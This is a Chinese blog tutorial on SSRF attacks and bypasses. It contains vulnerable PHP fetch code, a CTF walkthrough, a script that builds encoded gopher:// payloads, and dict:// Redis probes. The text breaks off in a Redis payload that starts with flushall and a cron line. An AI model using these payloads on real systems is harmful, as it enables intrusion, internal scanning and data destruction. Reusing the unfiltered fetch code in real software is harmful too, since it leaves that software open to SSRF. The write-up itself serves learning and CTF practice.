{"title":"从一文中了解SSRF的各种绕过姿势及攻击思路","uid":"5fdc9b0e6b2ac7fe212943a2f6d06f72","slug":"从一文了解SSRF的各种绕过姿势及攻击思路","date":"2022-07-04T04:04:10.000Z","updated":"2023-03-14T08:05:34.000Z","comments":true,"path":"api/articles/从一文了解SSRF的各种绕过姿势及攻击思路.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141513830.png","content":"<h1 id=\"声明\"><a href=\"#声明\" class=\"headerlink\" title=\"声明\"></a>声明</h1><p>文章首发于跳跳糖社区<a href=\"https://tttang.com/archive/1648/\">https://tttang.com/archive/1648/</a></p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>SSRF之前只有简单了解，进行二次学习后简单总结一下，希望能对正在学习SSRF的师傅们有所帮助</p>\n<h1 id=\"漏洞相关信息\"><a href=\"#漏洞相关信息\" class=\"headerlink\" title=\"漏洞相关信息\"></a>漏洞相关信息</h1><h2 id=\"漏洞成因\"><a href=\"#漏洞成因\" class=\"headerlink\" title=\"漏洞成因\"></a>漏洞成因</h2><p>SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p>\n<p>如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>\n<h2 id=\"漏洞定义\"><a href=\"#漏洞定义\" class=\"headerlink\" title=\"漏洞定义\"></a>漏洞定义</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>\n<h2 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h2><p>1、读取或更新内部资源，造成本地文件泄露；</p>\n<p>2、将含有漏洞防主机用作代理/跳板攻击内网主机，绕过防火墙等；</p>\n<p>3、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner 信息</p>\n<p>4、对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</p>\n<p>5、攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</p>\n<h1 id=\"所涉函数\"><a href=\"#所涉函数\" class=\"headerlink\" title=\"所涉函数\"></a>所涉函数</h1><h2 id=\"curl-exec\"><a href=\"#curl-exec\" class=\"headerlink\" title=\"curl_exec()\"></a>curl_exec()</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  curl_exec函数用于执行指定的cURL会话。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>举个栗子，代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$url</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//初始化curl会话</span>\n<span class=\"token variable\">$ch</span><span class=\"token operator\">=</span><span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token comment\">// 设置URL和相应的选项</span>\n<span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_HEADER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_RETURNTRANSFER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//// 抓取URL并把它传递给浏览器</span>\n<span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token comment\">//关闭cURL资源，并且释放系统资源</span>\n<span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这个时候我们就可以利用url参数，来获取内网的部分文件，直接写<code>127.0.0.1:/flag.php</code>这种即可，赋值给URL<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150647.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"file-get-contents\"><a href=\"#file-get-contents\" class=\"headerlink\" title=\"file_get_contents()\"></a>file_get_contents()</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> file_get_content函数从用户指定的url获取内容，然后指定一个文件名\n进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>对于<code>file_get_contents() </code>函数，它是可以获取文件内容的，我们这里也简单举个栗子来介绍其利用方式</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$url</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时就存在一种漏洞，就是可以直接读取内网的文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150280.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"fsockopen\"><a href=\"#fsockopen\" class=\"headerlink\" title=\"fsockopen()\"></a>fsockopen()</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">fsockopen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  fsockopen — 打开一个网络连接或者一个Unix套接字连接<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$host</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$fp</span> <span class=\"token operator\">=</span> <span class=\"token function\">fsockopen</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$host</span></span>\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errno</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errstr</span><span class=\"token punctuation\">,</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$errstr</span></span> (<span class=\"token interpolation\"><span class=\"token variable\">$errno</span></span>)&lt;br />\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$out</span> <span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"GET / HTTP/1.1\\r\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$out</span> <span class=\"token operator\">.=</span><span class=\"token string double-quoted-string\">\"Host: <span class=\"token interpolation\"><span class=\"token variable\">$host</span></span>\\r\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$out</span> <span class=\"token operator\">.=</span><span class=\"token string double-quoted-string\">\"Connection: Close\\r\\n\\r\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$out</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">feof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">,</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>fsockopen函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限,传输原始数据。<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150319.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"所涉协议\"><a href=\"#所涉协议\" class=\"headerlink\" title=\"所涉协议\"></a>所涉协议</h1><h2 id=\"file伪协议\"><a href=\"#file伪协议\" class=\"headerlink\" title=\"file伪协议\"></a>file伪协议</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">file<span class=\"token punctuation\">:</span><span class=\"token comment\">// — 访问本地文件系统</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>简单的说呢，就是探测本地的文件，比较官方的解释及用法如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">file<span class=\"token punctuation\">:</span><span class=\"token comment\">// 协议：</span>\n        条件 allow_url_fopen<span class=\"token punctuation\">:</span>off<span class=\"token operator\">/</span>on  allow_url_include <span class=\"token punctuation\">:</span>off<span class=\"token operator\">/</span>on\n        作用：用于访问本地文件系统。在<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>等参数可控的情况下\n             如果导入非php文件也会被解析为php\n        用法：\n            <span class=\"token number\">1.</span>file<span class=\"token punctuation\">:</span><span class=\"token comment\">//[文件的绝对路径和文件名]</span>\n            <span class=\"token number\">2.</span><span class=\"token punctuation\">[</span>文件的相对路径和文件名<span class=\"token punctuation\">]</span>\n            <span class=\"token number\">3.</span><span class=\"token punctuation\">[</span>http：<span class=\"token comment\">//网络路径和文件名]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>以简单题作为栗子来实践一下</p>\n<p>题目描述</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">尝试去读取一下Web目录下的flag<span class=\"token operator\">.</span>php吧<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>进入环境，一片空白，发现url参数，利用file伪协议尝试读取flag<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150272.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">url<span class=\"token operator\">=</span>file<span class=\"token punctuation\">:</span><span class=\"token comment\">///var/www/html/flag.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150292.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"Gopher协议\"><a href=\"#Gopher协议\" class=\"headerlink\" title=\"Gopher协议\"></a>Gopher协议</h2><p>当探测内网或执行命令时需要发送 POST 请求，我们可以利用 gopher 协议<br>协议格式：<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code>，这里的gopher-path就相当于是发送的请求数据包</p>\n<p>这个以ctfhub的一道小题来讲解<br>打开环境没有发现什么东西，扫一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150283.png\" alt=\"在这里插入图片描述\"><br>扫描后发现有个文件名字是flag.php文件，此时我们去访问这个文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150656.png\" alt=\"在这里插入图片描述\"><br>提示只能用本机来访问，此时我们构造如下payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">url<span class=\"token operator\">=</span>http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1/flag.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150687.png\" alt=\"在这里插入图片描述\"><br>发现是文件上传<br>此时查看一下文件源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">url<span class=\"token operator\">=</span>file<span class=\"token punctuation\">:</span><span class=\"token comment\">///var/www/html/flag.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>源码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REMOTE_ADDR\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string double-quoted-string\">\"127.0.0.1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Just View From 127.0.0.1\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"size\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"CTFHUB\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n\nUpload Webshell\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>/flag.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">enctype</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>multipart/form-data<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时发现确实是文件上传，只要文件大于0就可以成功上传，此时我们去尝试上传个文件，不过此时发现没有提交按钮….，无伤大雅，我们可以自己编辑前端代码创建一个提交按钮，构造代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150699.png\" alt=\"在这里插入图片描述\"></p>\n<p>然后随便上传个文件上去<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150743.png\" alt=\"在这里插入图片描述\"><br>此时修改host为127.0.0.1，就构造出了我们需要的post数据包，再运用如下脚本进行二次编码即可</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse\npayload <span class=\"token operator\">=</span>\\\n<span class=\"token triple-quoted-string string\">\"\"\"POST /flag.php HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------224170729831654278414248977569\nContent-Length: 525\nOrigin: http://challenge-fbeb7e53e47ecd22.sandbox.ctfhub.com:10800\nConnection: close\nReferer: http://challenge-fbeb7e53e47ecd22.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php\nUpgrade-Insecure-Requests: 1\n\n-----------------------------224170729831654278414248977569\nContent-Disposition: form-data; name=\"file\"; filename=\"1.txt\"\nContent-Type: application/octet-stream\n-----------------------------224170729831654278414248977569\nContent-Disposition: form-data; name=\"submit\"\n\n123\n-----------------------------224170729831654278414248977569--\n123\n-----------------------------224170729831654278414248977569\nContent-Disposition: form-data; name=\"submit\"\n\n123\n-----------------------------224170729831654278414248977569--\n\"\"\"</span>\n\n<span class=\"token comment\">#注意后面一定要有回车，回车结尾表示http请求结束</span>\ntmp <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nnew <span class=\"token operator\">=</span> tmp<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'%0A'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%0D%0A'</span><span class=\"token punctuation\">)</span>\nresult <span class=\"token operator\">=</span> <span class=\"token string\">'gopher://127.0.0.1:80/'</span><span class=\"token operator\">+</span><span class=\"token string\">'_'</span><span class=\"token operator\">+</span>new\nresult <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span>       <span class=\"token comment\"># 这里因为是GET请求所以要进行两次url编码</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>执行脚本后得到转码后的代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">gopher<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token comment\">//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A98.0%2529%2520Gecko/20100101%2520Firefox/98.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252C%252A/%252A%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------224170729831654278414248977569%250D%250AContent-Length%253A%2520525%250D%250AOrigin%253A%2520http%253A//challenge-fbeb7e53e47ecd22.sandbox.ctfhub.com%253A10800%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A//challenge-fbeb7e53e47ecd22.sandbox.ctfhub.com%253A10800/%253Furl%253Dhttp%253A//127.0.0.1/flag.php%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250A-----------------------------224170729831654278414248977569%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.txt%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A-----------------------------224170729831654278414248977569%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A123%250D%250A-----------------------------224170729831654278414248977569--%250D%250A123%250D%250A-----------------------------224170729831654278414248977569%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A123%250D%250A-----------------------------224170729831654278414248977569--%250D%250A  </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时直接赋值给url参数即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">url<span class=\"token operator\">=</span>gopher<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token comment\">//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A98.0%2529%2520Gecko/20100101%2520Firefox/98.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252C%252A/%252A%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------224170729831654278414248977569%250D%250AContent-Length%253A%2520525%250D%250AOrigin%253A%2520http%253A//challenge-fbeb7e53e47ecd22.sandbox.ctfhub.com%253A10800%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A//challenge-fbeb7e53e47ecd22.sandbox.ctfhub.com%253A10800/%253Furl%253Dhttp%253A//127.0.0.1/flag.php%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250A-----------------------------224170729831654278414248977569%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.txt%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A-----------------------------224170729831654278414248977569%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A123%250D%250A-----------------------------224170729831654278414248977569--%250D%250A123%250D%250A-----------------------------224170729831654278414248977569%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A123%250D%250A-----------------------------224170729831654278414248977569--%250D%250A  </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150758.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"dict协议\"><a href=\"#dict协议\" class=\"headerlink\" title=\"dict协议\"></a>dict协议</h2><p>ict 协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，能用来探测端口的指纹信息<br>协议格式：<code>dict://&lt;host&gt;:&lt;port&gt;/&lt;dict-path&gt;</code><br>一般用<code>dict://&lt;host&gt;:&lt;port&gt;/info</code> 探测端口应用信息</p>\n<p>举个栗子</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">dict<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:6379 //探测redis是否存活</span>\ndict<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:6379/info //探测端口应用信息</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150050.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150082.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"RESP协议\"><a href=\"#RESP协议\" class=\"headerlink\" title=\"RESP协议\"></a>RESP协议</h2><p>RESP 协议是 redis 服务之间数据传输的通信协议，redis 客户端和 redis 服务端之间通信会采取 RESP 协议<br>因此我们后续构造 payload 时也需要转换成 RESP 协议的格式</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">*</span><span class=\"token number\">1</span>\n<span class=\"token variable\">$8</span>\nflushall\n<span class=\"token operator\">*</span><span class=\"token number\">3</span>\n<span class=\"token variable\">$3</span>\n<span class=\"token class-name type-declaration\">set</span>\n<span class=\"token variable\">$1</span>\n<span class=\"token number\">1</span>\n<span class=\"token variable\">$64</span>\n\n<span class=\"token operator\">*</span><span class=\"token operator\">/</span><span class=\"token number\">1</span> <span class=\"token operator\">*</span> <span class=\"token operator\">*</span> <span class=\"token operator\">*</span> 